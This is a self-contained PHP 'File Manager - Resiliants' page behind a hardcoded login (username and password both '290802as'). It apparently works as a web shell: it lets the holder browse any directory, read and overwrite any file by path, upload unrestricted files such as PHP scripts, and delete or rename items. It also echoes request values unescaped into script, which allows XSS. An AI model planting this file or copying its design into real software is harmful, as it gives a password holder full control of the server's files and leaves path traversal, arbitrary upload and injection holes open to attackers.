<?php
session_start();

function isLoggedIn() {
    return isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true;
}

function login($username, $password) {
    $valid_username = "290802as";
    $valid_password = "290802as";

    if ($username === $valid_username && $password === $valid_password) {
        $_SESSION['loggedin'] = true;
        return true;
    }
    return false;
}

function logout() {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

function createFolder($folderName) {
    if (!is_dir($folderName)) {
        mkdir($folderName);
    }
}

function createFile($fileName) {
    if (!file_exists($fileName)) {
        fopen($fileName, "w");
    }
}

function uploadFile($file, $currentDir) {
    $target_dir = $currentDir . "/";
    $target_file = $target_dir . basename($file["name"]);
    move_uploaded_file($file["tmp_name"], $target_file);
}

function renameItem($oldName, $newName) {
    if (file_exists($oldName)) {
        rename($oldName, $newName);
    }
}

function deleteItem($itemName) {
    if (is_dir($itemName)) {
        rmdir($itemName);
    } else {
        unlink($itemName);
    }
}

function editFile($fileName, $content) {
    file_put_contents($fileName, $content);
}

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (isset($_POST['login'])) {
        $username = $_POST['username'];
        $password = $_POST['password'];

        if (login($username, $password)) {
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = "Username atau password salah!";
        }
    } elseif (isset($_POST['logout'])) {
        logout();
    } elseif (isLoggedIn()) {
        $currentDir = isset($_GET['dir']) ? $_GET['dir'] : '.';
        $fullPathCurrentDir = realpath($currentDir);
        $action = '';

        if (isset($_POST['create_folder'])) {
            createFolder($fullPathCurrentDir . DIRECTORY_SEPARATOR . $_POST['folder_name']);
            $action = 'Folder created';
        } elseif (isset($_POST['create_file'])) {
            createFile($fullPathCurrentDir . DIRECTORY_SEPARATOR . $_POST['file_name']);
            $action = 'File created';
        } elseif (isset($_POST['upload_file'])) {
            uploadFile($_FILES['file_to_upload'], $fullPathCurrentDir);
            $action = 'File uploaded';
        } elseif (isset($_POST['rename_item'])) {
            $oldName = $fullPathCurrentDir . DIRECTORY_SEPARATOR . $_POST['old_name'];
            $newName = $fullPathCurrentDir . DIRECTORY_SEPARATOR . $_POST['new_name'];
            renameItem($oldName, $newName);
            $action = 'Item renamed';
        } elseif (isset($_POST['delete_item'])) {
            $itemName = $fullPathCurrentDir . DIRECTORY_SEPARATOR . $_POST['item_name'];
            deleteItem($itemName);
            $action = 'Item deleted';
        } elseif (isset($_POST['edit_file'])) {
            editFile($_POST['file_name'], $_POST['file_content']);
            $action = 'File edited';
        }

        echo "<script>
            Swal.fire({
                icon: 'success',
                title: '$action',
                showConfirmButton: false,
                timer: 1500
            }).then(() => {
                window.location.href = window.location.href.split('?')[0] + '?dir=" . urlencode($currentDir) . "';
            });
        </script>";
    }
}

$currentDir = isset($_GET['dir']) ? $_GET['dir'] : '.';
$fullPathCurrentDir = realpath($currentDir);
$items = $fullPathCurrentDir ? scandir($fullPathCurrentDir) : [];

function createBreadcrumb($currentDir) {
    $root = $_SERVER['DOCUMENT_ROOT'];
    $currentDir = realpath($currentDir);
    $path_parts = explode(DIRECTORY_SEPARATOR, $currentDir);
    $path_display = "";
    $breadcrumb = 'Directory: ';

    foreach ($path_parts as $index => $path_part) {
        if ($index > 0) {
            $path_display .= DIRECTORY_SEPARATOR;
        }
        $path_display .= $path_part;
        $breadcrumb .= '<a href="?dir=' . urlencode(str_replace($root, '', $path_display)) . '" class="text-purple-400 hover:underline">' . htmlspecialchars($path_part) . '</a> ➜ ';
    }

    return rtrim($breadcrumb, ' ➜ ');
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>File Manager - Resiliants</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
</head>
<body class="bg-gradient-to-br from-gray-900 via-purple-900 to-black min-h-screen text-white font-sans">
<?php if (!isLoggedIn()): ?>
  <div class="flex items-center justify-center h-screen">
    <div class="bg-gray-800 shadow-xl rounded-lg p-8 w-full max-w-md">
      <h2 class="text-2xl font-bold mb-6 text-center text-purple-400">Login File Manager</h2>

      <?php if (isset($error)): ?>
        <div class="bg-red-500 text-white p-3 rounded mb-4">
          <?php echo $error; ?>
        </div>
      <?php endif; ?>

      <form method="POST" class="space-y-4">
        <div>
          <label for="username" class="block text-sm">Username</label>
          <input type="text" id="username" name="username" required class="w-full px-3 py-2 bg-gray-700 rounded border border-gray-600 focus:outline-none focus:ring-2 focus:ring-purple-500" />
        </div>
        <div>
          <label for="password" class="block text-sm">Password</label>
          <input type="password" id="password" name="password" required class="w-full px-3 py-2 bg-gray-700 rounded border border-gray-600 focus:outline-none focus:ring-2 focus:ring-purple-500" />
        </div>
        <button type="submit" name="login" class="w-full bg-purple-600 hover:bg-purple-700 transition px-4 py-2 rounded text-white font-semibold">Login</button>
      </form>
    </div>
  </div>
<?php else: ?>
	<nav class="bg-gray-900 border-b border-gray-800 p-4">
  <div class="max-w-7xl mx-auto flex flex-wrap items-center justify-between">
    <div class="text-xl font-bold text-purple-400">File Manager</div>
    <div class="flex flex-wrap gap-2 mt-2 md:mt-0">

      <!-- Create Folder -->
      <form method="POST" class="flex gap-2">
        <input type="text" name="folder_name" placeholder="Folder name" class="bg-gray-800 text-white px-3 py-1 rounded border border-gray-600 focus:outline-none" />
        <button type="submit" name="create_folder" class="bg-green-600 hover:bg-green-700 px-3 py-1 rounded text-white">Create</button>
      </form>

      <!-- Create File -->
      <form method="POST" class="flex gap-2">
        <input type="text" name="file_name" placeholder="File name" class="bg-gray-800 text-white px-3 py-1 rounded border border-gray-600 focus:outline-none" />
        <button type="submit" name="create_file" class="bg-blue-600 hover:bg-blue-700 px-3 py-1 rounded text-white">Create</button>
      </form>

      <!-- Upload File -->
      <form method="POST" enctype="multipart/form-data" class="flex gap-2">
        <input type="file" name="file_to_upload" class="text-sm text-white file:bg-gray-700 file:text-white file:rounded file:border-0 file:px-3 file:py-1"/>
        <button type="submit" name="upload_file" class="bg-yellow-600 hover:bg-yellow-700 px-3 py-1 rounded text-white">Upload</button>
      </form>

      <!-- Logout -->
      <form method="POST">
        <button type="submit" name="logout" class="bg-red-600 hover:bg-red-700 px-3 py-1 rounded text-white">Logout</button>
      </form>
    </div>
  </div>
</nav>

<div class="max-w-7xl mx-auto p-4">
  <div class="mb-4 text-sm text-purple-300">
    <?php echo createBreadcrumb($currentDir); ?>
  </div>

  <div class="overflow-x-auto">
    <table class="w-full text-sm table-auto text-left border-collapse">
      <thead>
        <tr class="bg-gray-800 text-purple-300">
          <th class="p-2 border-b border-gray-700">Item</th>
          <th class="p-2 border-b border-gray-700">Actions</th>
        </tr>
      </thead>
      <tbody>
        <?php 
        $directories = [];
        $files = [];
        foreach ($items as $item): 
            if ($item != '.' && $item != '..'): 
                if (is_dir($fullPathCurrentDir . DIRECTORY_SEPARATOR . $item)) {
                    $directories[] = $item;
                } else {
                    $files[] = $item;
                }
            endif; 
        endforeach;

        foreach ($directories as $dir): ?>
        <tr class="hover:bg-gray-800">
          <td class="p-2">
            <a href="?dir=<?php echo urlencode($currentDir . DIRECTORY_SEPARATOR . $dir); ?>" class="text-blue-400 hover:underline">
              <?php echo htmlspecialchars($dir); ?>
            </a>
          </td>
          <td class="p-2 flex flex-wrap gap-2">
            <form method="POST" class="flex gap-2">
              <input type="hidden" name="item_name" value="<?php echo htmlspecialchars($dir); ?>">
              <button type="submit" name="delete_item" onclick="return confirm('Delete this folder?');" class="bg-red-500 hover:bg-red-600 px-2 py-1 rounded text-white">Delete</button>
            </form>
            <form method="POST" class="flex gap-2">
              <input type="hidden" name="old_name" value="<?php echo htmlspecialchars($dir); ?>">
              <input type="text" name="new_name" placeholder="New name" class="bg-gray-800 px-2 py-1 rounded border border-gray-600 text-white"/>
              <button type="submit" name="rename_item" class="bg-gray-600 hover:bg-gray-700 px-2 py-1 rounded text-white">Rename</button>
            </form>
          </td>
        </tr>
        <?php endforeach; ?>

        <?php foreach ($files as $file): ?>
        <tr class="hover:bg-gray-800">
          <td class="p-2"><?php echo htmlspecialchars($file); ?></td>
          <td class="p-2 flex flex-wrap gap-2">
            <form method="POST" class="flex gap-2">
              <input type="hidden" name="item_name" value="<?php echo htmlspecialchars($file); ?>">
              <button type="submit" name="delete_item" onclick="return confirm('Delete this file?');" class="bg-red-500 hover:bg-red-600 px-2 py-1 rounded text-white">Delete</button>
            </form>
            <form method="POST" class="flex gap-2">
              <input type="hidden" name="old_name" value="<?php echo htmlspecialchars($file); ?>">
              <input type="text" name="new_name" placeholder="New name" class="bg-gray-800 px-2 py-1 rounded border border-gray-600 text-white"/>
              <button type="submit" name="rename_item" class="bg-gray-600 hover:bg-gray-700 px-2 py-1 rounded text-white">Rename</button>
            </form>
            <a href="?edit=<?php echo urlencode($fullPathCurrentDir . DIRECTORY_SEPARATOR . $file); ?>&dir=<?php echo urlencode($currentDir); ?>" class="bg-blue-500 hover:bg-blue-600 px-2 py-1 rounded text-white">Edit</a>
          </td>
        </tr>
        <?php endforeach; ?>
      </tbody>
    </table>
  </div>
</div>
<?php if (isset($_GET['edit'])): ?>
  <div id="editModal" class="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-70">
    <div class="bg-gray-900 w-full max-w-3xl rounded-lg shadow-xl p-6">
      <div class="flex justify-between items-center mb-4">
        <h2 class="text-lg font-bold text-purple-300">Edit File: <?php echo basename($_GET['edit']); ?></h2>
        <a href="?dir=<?php echo urlencode($currentDir); ?>" class="text-gray-400 hover:text-red-400 text-xl font-bold">×</a>
      </div>
      <form method="POST" class="space-y-4">
        <input type="hidden" name="file_name" value="<?php echo htmlspecialchars($_GET['edit']); ?>">
        <textarea name="file_content" rows="15" class="w-full bg-gray-800 text-white p-4 rounded border border-gray-700 focus:outline-none focus:ring-2 focus:ring-purple-500"><?php echo htmlspecialchars(file_get_contents($_GET['edit'])); ?></textarea>
        <div class="flex justify-end gap-2">
          <button type="submit" name="edit_file" class="bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded">Save</button>
          <a href="?dir=<?php echo urlencode($currentDir); ?>" class="bg-gray-600 hover:bg-gray-700 text-white px-4 py-2 rounded">Cancel</a>
        </div>
      </form>
    </div>
  </div>
<?php endif; ?>
<script>
  document.addEventListener('DOMContentLoaded', () => {
    <?php if (isset($action)): ?>
      Swal.fire({
        icon: 'success',
        title: '<?php echo $action; ?>',
        showConfirmButton: false,
        timer: 1500
      }).then(() => {
        window.location.href = window.location.href.split('?')[0] + '?dir=' + encodeURIComponent('<?php echo $currentDir; ?>');
      });
    <?php endif; ?>
  });
</script>
<?php endif; ?>
</body>
</html>